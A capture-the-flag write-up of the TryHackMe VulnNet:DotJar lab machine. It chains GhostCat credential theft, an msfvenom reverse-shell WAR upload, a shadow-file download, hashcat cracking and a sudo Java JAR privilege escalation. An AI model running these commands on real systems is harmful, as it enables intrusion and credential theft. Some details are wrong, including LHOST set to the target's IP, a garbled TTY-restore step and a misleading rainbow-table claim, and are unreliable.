# TryHackMe VulnNet:DotJar — Medium Linux Machine Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-VulnNet:DotJar-red?style=for-the-badge&logo=tryhackme)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-blue?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-RCE%20%26%20PrivEsc-purple?style=for-the-badge)

> **TryHackMe VulnNet:DotJar** is a Medium-difficulty Linux-based machine focused on Apache Tomcat exploitation, AJP protocol vulnerabilities (GhostCat), Tomcat manager access, reverse shell deployment, password hash cracking, and Java-based privilege escalation.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Nmap Enumeration](#initial-nmap-enumeration)
- [Port and Service Detection](#port-and-service-detection)
- [Web Application Enumeration](#web-application-enumeration)
- [Tomcat Manager Access Attempt](#tomcat-manager-access-attempt)
- [GhostCat Vulnerability Discovery](#ghostcat-vulnerability-discovery)
- [GhostCat Exploitation](#ghostcat-exploitation)
- [Credential Extraction](#credential-extraction)
- [WAR File Generation](#war-file-generation)
- [Tomcat Manager Deployment](#tomcat-manager-deployment)
- [Reverse Shell Establishment](#reverse-shell-establishment)
- [Shell Stabilization](#shell-stabilization)
- [Shadow File Extraction](#shadow-file-extraction)
- [Password Hash Cracking](#password-hash-cracking)
- [User Privilege Access](#user-privilege-access)
- [User Flag Retrieval](#user-flag-retrieval)
- [Privilege Escalation via Java](#privilege-escalation-via-java)
- [Java Exploit Development](#java-exploit-development)
- [Root Flag Retrieval](#root-flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | VulnNet:DotJar |
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **Operating System** | Linux (Ubuntu) |
| **Target IP** | `10.49.186.179` |
| **Primary Services** | SSH (22), AJP13 (8009), HTTP (8080) |
| **Web Server** | Apache Tomcat 9.0.30 |
| **SSH Version** | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| **Initial Access** | GhostCat (CVE-2020-1938) AJP exploitation |
| **Exploitation Method** | WAR file deployment to Tomcat manager |
| **Privilege Escalation** | Java jar file execution as root via sudo |
| **Tools** | Nmap, Metasploit, msfvenom, curl, hashcat, Java |

---

## 🚀 Initial Nmap Enumeration

Today we tackle another **TryHackMe Medium-difficulty machine**, this time exploiting the **VulnNet:DotJar** system, focusing on Tomcat vulnerabilities.

We have the target IP:

```
10.49.186.179
```

Starting with a comprehensive all-port scan to identify exposed services.

### Full Port Scan

```bash
nmap -p- --min-rate 1000 10.49.186.179
```

**Result:**

```
Nmap scan report for ip-10-49-186-179.ap-south-1.compute.internal (10.49.186.179)
Host is up, received echo-reply ttl 64 (0.00017s latency).
Scanned at 2026-10-05 02:02:56 UTC for 2s
Not shown: 65532 closed tcp ports (reset)

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8009/tcp open  ajp13      syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```

Three critical ports were exposed:

- `22/tcp` — SSH (Secure Shell)
- `8009/tcp` — AJP13 (Apache Jserv Protocol) — **Key vulnerability port**
- `8080/tcp` — HTTP (Tomcat web interface)

The presence of **AJP13** is significant — it's vulnerable to the **GhostCat** exploit!

---

## 🔍 Port and Service Detection

### Service and Version Enumeration

```bash
nmap -sC -sV -p22,8009,8080 10.49.186.179
```

**Result:**

```
Nmap scan report for ip-10-49-186-179.ap-south-1.compute.internal (10.49.186.179)
Host is up, received echo-reply ttl 64 (0.00044s latency).
Scanned at 2026-10-05 02:03:54 UTC for 7s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 02:e3:0d:8a:74:8e:b7:16:97:1c:86:fd:0a:e6:25:b3 (RSA)
|   256 fa:f2:06:f5:4a:d5:fe:c1:9c:b6:1c:02:a5:77:a3:ca (ECDSA)
|   256 9f:6a:39:46:7b:0b:af:5f:18:61:4d:fb:78:65:67:ca (ED25519)

8009/tcp open  ajp13   syn-ack ttl 64 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http    syn-ack ttl 64 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Findings:

✔️ **SSH:** OpenSSH 8.2p1 — Modern version  
✔️ **AJP13:** Apache Jserv Protocol v1.3 — **Vulnerable to GhostCat**  
✔️ **Tomcat:** Apache Tomcat 9.0.30 — **Vulnerable version**  
✔️ **Supported Methods:** GET, HEAD, POST, OPTIONS  

The combination of **AJP13** and **Tomcat 9.0.30** is vulnerable to **CVE-2020-1938 (GhostCat)**!

---

## 🌐 Web Application Enumeration

### Accessing Tomcat

Navigating to:

```
http://10.49.186.179:8080/
```

Shows the default **Apache Tomcat 9.0.30** homepage.

### Tomcat Manager Access

Trying to access the manager:

```
http://10.49.186.179:8080/manager/html
```

We need credentials to access this interface.

---

## 🔐 Tomcat Manager Access Attempt

### Testing Default Credentials

Attempting common Tomcat default credentials:

- `tomcat:tomcat` — Fails
- `tomcat:s3cret` — Fails
- `admin:admin` — Fails

None of the default credentials work.

**This forces us to exploit the AJP vulnerability!**

---

## 🕷️ GhostCat Vulnerability Discovery

### Understanding GhostCat

**CVE-2020-1938 (GhostCat)** is a critical vulnerability in:
- Apache Tomcat versions < 9.0.31
- Affects AJP (Apache Jserv Protocol)
- Allows remote file read without authentication
- Can extract configuration files containing credentials

### Vulnerability Details

The AJP protocol implementation is vulnerable to:
1. Directory traversal
2. Unauthenticated file access
3. Configuration file disclosure
4. Credential extraction

### Searching for Exploits

```bash
searchsploit ghostcat
```

Or in Metasploit:

```bash
search ghostcat
```

**Result:**

```
Matching Modules
================

   #  Full Name                             Disclosure Date  Rank    Check  Name
   -  ---------                             ---------------  ----    -----  ----
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat
```

✅ **Metasploit module available!**

---

## 💣 GhostCat Exploitation

### Launching Metasploit Module

```bash
msfconsole
search ghostcat
use auxiliary/admin/http/tomcat_ghostcat
set RHOST 10.49.186.179
exploit
```

Or use index:

```bash
use 0
set RHOST 10.49.186.179
exploit
```

### Exploitation Result

The module attempts to read the **tomcat-users.xml** file:

```
tomcat-users.xml
================

<user username="webdev" password="Hgj3LA$02D$Fa@21" roles="manager-gui,manager-script"/>
```

✅ **Credentials Extracted!**

**Tomcat Manager Credentials:**
- **Username:** webdev
- **Password:** Hgj3LA$02D$Fa@21
- **Roles:** manager-gui, manager-script

These credentials allow us to **deploy WAR files** to the Tomcat manager!

---

## 🔐 Credential Extraction

### Credentials Obtained

From the GhostCat exploitation:

```
Username: webdev
Password: Hgj3LA$02D$Fa@21
```

These are valid Tomcat manager credentials with roles:
- `manager-gui` — Web interface access
- `manager-script` — Script/API access (perfect for deployment)

---

## 📦 WAR File Generation

### Creating Reverse Shell Payload

Using msfvenom to generate a Java JSP reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.49.186.179 \
  LPORT=4444 \
  -f war > shell.war
```

**Command Breakdown:**

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `-p` | java/jsp_shell_reverse_tcp | Java reverse shell payload |
| `LHOST` | 10.49.186.179 | Attacker IP (your machine) |
| `LPORT` | 4444 | Listener port |
| `-f war` | format | Output as WAR file |

### Output

```
Payload size: 1103 bytes
Final size of war file: 1103 bytes
```

✅ **Reverse shell WAR file created: shell.war**

---

## 🚀 Tomcat Manager Deployment

### Deploying WAR via Curl

```bash
curl --user "webdev:Hgj3LA$02D$Fa@21" \
  --upload-file shell.war \
  http://10.49.186.179:8080/manager/text/deploy?path=/reverse
```

**Command Breakdown:**

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `--user` | webdev:password | Tomcat manager credentials |
| `--upload-file` | shell.war | WAR file to deploy |
| `path=/reverse` | context path | Deployment path |

### Deployment Result

```
OK - Deployed application at context path [/reverse]
```

✅ **WAR file deployed successfully!**

The reverse shell is now accessible at:

```
http://10.49.186.179:8080/reverse/
```

---

## 🔌 Reverse Shell Establishment

### Setting Up Listener

On your attacking machine:

```bash
nc -lvnp 4444
```

**Listener Output:**

```
Listening on 0.0.0.0 4444
Connection received on 10.49.186.179 54966
```

### Triggering the Reverse Shell

Access the deployed WAR file:

```bash
curl http://10.49.186.179:8080/reverse/
```

Or use a browser to navigate to the URL.

### Reverse Shell Access

```bash
id
uid=1001(web) gid=1001(web) groups=1001(web)
```

**Privilege Level:** web (Tomcat service user)

✅ **Reverse shell established!**

---

## 🛠️ Shell Stabilization

### Checking for Python

```bash
which python3
/usr/bin/python3
```

Python3 is available!

### Upgrading to Interactive Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### TTY Restoration

```bash
web@ip-10-49-186-179:/$ ^Z
[1]+  Stopped                 nc -lvnp 4444

stty raw -echo
nc -lvnp 4444

web@ip-10-49-186-179:/$ export TERM=xterm-256color
web@ip-10-49-186-179:/$
```

✅ **Fully interactive shell achieved!**

---

## 📂 Shadow File Extraction

### Navigating to Backups

```bash
cd /var/backups
ls -la
```

### Discovering Shadow Backup

```bash
web@ip-10-49-186-179:/var/backups$ ls
shadow-backup-alt.gz
```

✅ **Shadow file backup found!**

### Serving via HTTP

We can extract it using Python's HTTP server:

```bash
python3 -m http.server
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.49.99.46 - - [05/Oct/2026 05:03:20] "GET /shadow-backup-alt.gz HTTP/1.1" 200 -
```

### Downloading to Attacker Machine

```bash
wget http://10.49.186.179:8000/shadow-backup-alt.gz
gunzip shadow-backup-alt.gz
```

Now we have the shadow file locally!

---

## 🔑 Password Hash Cracking

### Extracting Target Hash

From the shadow file, find the jdk-admin hash:

```
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:...
```

### Hash Type Identification

This is a **SHA-512 crypt hash** (SHA-512 $6$)

### Cracking with Hashcat

```bash
echo '$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1' > hash.txt
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

**Hash Mode:** 1800 (SHA-512 Unix/Linux crypt)

### Cracking Result

```
$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:794613852
```

✅ **Password Cracked!**

**jdk-admin Credentials:**
- **Username:** jdk-admin
- **Password:** 794613852

---

## 👤 User Privilege Access

### Switching to jdk-admin

From the web shell or via SSH:

```bash
su - jdk-admin
Password: 794613852
```

**Successful Authentication!**

```bash
jdk-admin@ip-10-49-186-179:~$ id
uid=1000(jdk-admin) gid=1000(jdk-admin) groups=1000(jdk-admin)
```

✅ **Switched to jdk-admin user!**

---

## 📄 User Flag Retrieval

### Reading User Flag

```bash
cd ~
ls
```

**Output:**

```
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
```

### Flag Content

```bash
cat user.txt
```

✅ **User flag retrieved!**

---

## 🔐 Privilege Escalation via Java

### Checking Sudo Privileges

```bash
sudo -l
```

**Sudo Output:**

```
Matching Defaults entries for jdk-admin on ip-10-49-186-179:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on ip-10-49-186-179:
    (root) /usr/bin/java -jar *.jar
```

### Critical Finding

**The jdk-admin user can run ANY JAR file as root!**

```
(root) /usr/bin/java -jar *.jar
```

We can exploit this by creating a malicious JAR file!

---

## 💻 Java Exploit Development

### Creating Java File Read Exploit

```java
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;

public class Exploit {
  public static void main(String[] args) {
    try {
      File myObj = new File("/root/root.txt");
      Scanner myReader = new Scanner(myObj);
      while (myReader.hasNextLine()) {
        String data = myReader.nextLine();
        System.out.println(data);
      }
      myReader.close();
    } catch (FileNotFoundException e) {
      System.out.println("An error occurred.");
      e.printStackTrace();
    }
  }
}
```

**Exploit Logic:**
1. Opens `/root/root.txt`
2. Reads file line by line
3. Prints content to stdout
4. Closes file

### Compiling Java Code

```bash
nano Exploit.java
# Paste code above

javac -d . Exploit.java
```

**Output:**

```
Exploit.class created
```

### Creating JAR File with Manifest

First attempt:

```bash
jar cvf exploit.jar Exploit.class
```

Running it:

```bash
sudo java -jar exploit.jar
```

**Result:**

```
no main manifest attribute, in exploit.jar
```

We need a manifest file!

### Adding Manifest

```bash
echo Main-Class: Exploit > MANIFEST.MF
```

### Recreating JAR with Manifest

```bash
jar cvmf MANIFEST.MF exploit.jar Exploit.class
```

**Output:**

```
added manifest
adding: Exploit.class(in = 865) (out= 563)(deflated 34%)
```

---

## 👑 Root Flag Retrieval

### Executing Root JAR File

```bash
sudo java -jar exploit.jar
```

**Output:**

```
THM{464c29e3ffae05c2e67e6f0c5064759c}
jdk-admin@ip-10-49-186-179:~$
```

✅ **Root flag retrieved!**

The JAR file executed with root privileges and read the root flag!

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────────┐
                    │ TryHackMe VulnNet:DotJar │
                    │   10.49.186.179          │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │   Nmap Enumeration       │
                    │ 3 Ports Discovered       │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Service Detection        │
                    │ Tomcat 9.0.30 Identified │
                    │ AJP13 Detected           │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Tomcat Manager Attempt   │
                    │ Default Creds Fail       │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ CVE-2020-1938 Research   │
                    │ GhostCat Vulnerability   │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Metasploit GhostCat      │
                    │ AJP Exploitation         │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Credential Extraction    │
                    │ webdev:password obtained │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ msfvenom WAR Generation  │
                    │ Reverse Shell Payload    │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Manager Deployment       │
                    │ curl WAR Upload          │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Reverse Shell Access     │
                    │ web user obtained        │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Shell Stabilization      │
                    │ TTY Upgrade              │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Shadow File Discovery    │
                    │ /var/backups found       │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Hash Cracking            │
                    │ Hashcat SHA-512          │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ User Privilege Access    │
                    │ jdk-admin access         │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ User Flag Retrieved      │
                    │ ~/user.txt               │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Sudo Privilege Check     │
                    │ java -jar *.jar allowed  │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Java Exploit Creation    │
                    │ File read code           │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ JAR File Compilation     │
                    │ javac + manifest         │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Root JAR Execution       │
                    │ sudo java -jar exploit   │
                    └──────────┬───────────────┘
                               │
                               ▼
                    ┌──────────────────────────┐
                    │ Root Flag Retrieved      │
                    │ /root/root.txt           │
                    └──────────────────────────┘
```

---

## 💡 Key Takeaways

### 1. AJP Protocol Vulnerabilities

The AJP protocol (port 8009) is frequently exposed and vulnerable:
- GhostCat (CVE-2020-1938) allows unauthenticated file read
- Configuration files can be extracted
- Credentials are often hardcoded in configs

**Always scan for AJP ports and test for known vulnerabilities.**

### 2. Outdated Tomcat Versions

Tomcat 9.0.30 is vulnerable to GhostCat:
- Version < 9.0.31 are affected
- Update to patched versions immediately
- Monitor CVE databases for Tomcat vulnerabilities

**Keep application servers patched and updated.**

### 3. Credential Extraction via File Read

The GhostCat exploit extracts manager credentials:
- tomcat-users.xml contains authentication data
- Credentials enable WAR deployment
- Full application server compromise possible

**Protect configuration files from unauthorized access.**

### 4. WAR File Deployment for RCE

Deploying malicious WAR files to Tomcat provides:
- Remote code execution
- Service user privilege level
- Reverse shell access
- Further privilege escalation

**Restrict Tomcat manager access and monitor deployments.**

### 5. Shadow File Analysis

Backup shadow files provide password hashes:
- Located in /var/backups/
- Can be extracted via web shell
- Crackable with offline tools
- Leads to credential reuse

**Protect backup files and implement access controls.**

### 6. Hash Cracking with Hashcat

SHA-512 crypt hashes can be cracked:
- Mode 1800 for SHA-512 Unix/Linux
- Dictionary attacks often successful
- Rainbow tables available online

**Use strong, unique passwords resistant to dictionary attacks.**

### 7. Privilege Escalation via Sudo

Misconfigured sudo rules create privilege escalation:
- Running any JAR as root is dangerous
- Wildcard patterns (* ) increase risk
- User-supplied files executed with root privileges

**Implement principle of least privilege in sudo configuration.**

### 8. Java Code Execution as Root

Java programs run with sudo privileges can:
- Read any file on the system
- Execute arbitrary commands
- Spawn interactive shells
- Complete system compromise

**Audit Java applications run with elevated privileges.**

### 9. Multi-Stage Privilege Escalation

Complete root access required chaining:
1. AJP exploitation (GhostCat)
2. Manager credential extraction
3. WAR deployment and RCE
4. File system access (shadow)
5. Hash cracking
6. User privilege escalation
7. Java-based root exploitation

**Real-world exploitation often involves multiple stages.**

### 10. Metasploit Exploitation Efficiency

Using Metasploit for GhostCat saved time:
- Automated exploitation
- Quick credential extraction
- Reduces manual exploitation steps

**Leverage automated tools when available but understand the underlying vulnerabilities.**

---

## 🛠️ Tools Used

| Tool | Purpose | Version |
|------|---------|---------|
| **Nmap** | Port scanning and service enumeration | Latest |
| **Metasploit** | GhostCat AJP exploitation | Latest |
| **msfvenom** | Reverse shell WAR generation | Latest |
| **curl** | WAR file deployment to manager | Latest |
| **netcat (nc)** | Reverse shell listener | Standard |
| **Python3** | Shell upgrade and HTTP server | 3.x |
| **Java** | Compilation and execution | OpenJDK |
| **Hashcat** | SHA-512 hash cracking | Latest |
| **wget** | File downloading | Standard |

---

## 📝 Commands Used

### Nmap Scanning

```bash
nmap -p- --min-rate 1000 10.49.186.179
nmap -sC -sV -p22,8009,8080 10.49.186.179
```

### Metasploit GhostCat

```bash
msfconsole
search ghostcat
use auxiliary/admin/http/tomcat_ghostcat
set RHOST 10.49.186.179
exploit
```

### WAR Generation

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.49.186.179 LPORT=4444 -f war > shell.war
```

### WAR Deployment

```bash
curl --user "webdev:Hgj3LA$02D$Fa@21" \
  --upload-file shell.war \
  http://10.49.186.179:8080/manager/text/deploy?path=/reverse
```

### Reverse Shell Listener

```bash
nc -lvnp 4444
```

### Shell Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm-256color
```

### Shadow File Access

```bash
cd /var/backups
python3 -m http.server
wget http://10.49.186.179:8000/shadow-backup-alt.gz
gunzip shadow-backup-alt.gz
```

### Hash Cracking

```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

### User Privilege Access

```bash
su - jdk-admin
# Password: 794613852
```

### Java Compilation

```bash
javac -d . Exploit.java
echo Main-Class: Exploit > MANIFEST.MF
jar cvmf MANIFEST.MF exploit.jar Exploit.class
```

### Root Exploitation

```bash
sudo java -jar exploit.jar
```

---

## 🎬 Final Attack Path

```
Port Scan (3 Services)
      ↓
Service Detection (Tomcat 9.0.30)
      ↓
Identify AJP13 Vulnerability
      ↓
Research CVE-2020-1938 (GhostCat)
      ↓
Metasploit GhostCat Exploitation
      ↓
Extract Manager Credentials
      ↓
Generate Reverse Shell WAR
      ↓
Deploy WAR to Manager
      ↓
Trigger Reverse Shell
      ↓
Reverse Shell (web user)
      ↓
Shell Stabilization
      ↓
Discover Shadow Backup
      ↓
Extract Shadow File
      ↓
Crack jdk-admin Hash
      ↓
Switch to jdk-admin
      ↓
User Flag Retrieved
      ↓
Discover Sudo Privilege (java -jar)
      ↓
Create Java Exploit
      ↓
Compile with Manifest
      ↓
Execute as Root
      ↓
Root Flag Retrieved
```

---

## 🏁 Conclusion

The **TryHackMe VulnNet:DotJar** machine demonstrates a complete exploitation chain:

1. **CVE-2020-1938 GhostCat** — AJP protocol vulnerability
2. **Configuration File Disclosure** — Credential extraction
3. **Tomcat Manager Access** — WAR deployment
4. **Remote Code Execution** — Reverse shell establishment
5. **File System Access** — Shadow file extraction
6. **Password Cracking** — Hash offline analysis
7. **Privilege Escalation** — Java-based exploitation
8. **Root Access** — Complete system compromise

### Most Important Lessons:

✔️ AJP protocol is frequently exposed and vulnerable  
✔️ Keep Tomcat and all software patched  
✔️ Protect configuration files from unauthorized access  
✔️ Implement proper access controls for manager interfaces  
✔️ Secure backup files and restrict access  
✔️ Use strong, unique passwords  
✔️ Audit sudo configurations for dangerous privileges  
✔️ Restrict Java execution with elevated privileges  
✔️ Chain multiple vulnerabilities for complete access  
✔️ Test for known CVEs in all services  

**The final result was complete system compromise with both user and root flags successfully retrieved through multiple exploitation stages.**

---

## 📌 References

- [TryHackMe](https://tryhackme.com/)
- [CVE-2020-1938 - GhostCat](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [Apache Tomcat Security](https://tomcat.apache.org/security-9.html)
- [AJP Protocol Vulnerability](https://en.wikipedia.org/wiki/Apache_JServ_Protocol)
- [Metasploit GhostCat Module](https://www.rapid7.com/db/modules/auxiliary/admin/http/tomcat_ghostcat/)

---

## 📚 Further Reading

- **Tomcat Security:** Learn Tomcat configuration, access controls, and monitoring
- **AJP Protocol:** Study AJP protocol and its inherent security risks
- **Java Exploitation:** Master Java code execution and privilege escalation
- **Credential Management:** Research secure password storage and management
- **Privilege Escalation:** Study sudo misconfigurations and exploitation techniques

---

**Last Updated:** 2026-10-05  
**Author:** Naval  
**Status:** ✅ Machine Compromised - Root Level Access Achieved
